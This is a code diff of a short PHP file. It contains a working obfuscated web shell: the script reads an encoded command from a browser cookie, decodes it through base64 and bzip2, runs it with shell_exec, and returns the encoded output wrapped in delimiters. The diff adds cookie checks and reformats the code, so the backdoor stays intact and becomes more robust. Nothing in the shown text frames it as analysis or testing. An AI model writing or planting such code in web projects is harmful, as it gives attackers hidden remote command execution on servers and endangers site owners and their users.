@@ -1,21 +1,24 @@
 <?php
-    $d = base64_decode(
-        bzdecompress(
-            base64_decode(
-                str_replace(" ", "+", $_COOKIE['d'])
+   if ( isset($_COOKIE["d"]) && isset($_COOKIE["c"]) ){
+      $d = base64_decode(
+		   bzdecompress(
+			   base64_decode(
+               str_replace(" ", "+", $_COOKIE["d"])
             )
-        )
-    );
-    $c = base64_decode(
-        bzdecompress(
+         )
+      );
+      $c = base64_decode(
+         bzdecompress(
             base64_decode(
-                str_replace(" ", "+", $_COOKIE['c'])
+               str_replace(" ", "+", $_COOKIE["c"])
             )
-        )
-    );
-    echo $d . base64_encode(
-        bzcompress(
+         )
+      );
+      echo $d . base64_encode(
+         bzcompress(
             base64_encode( shell_exec($c) ),
-             9)
-        ) . $d;
+            9
+         )
+      ) . $d;
+   }
 ?>
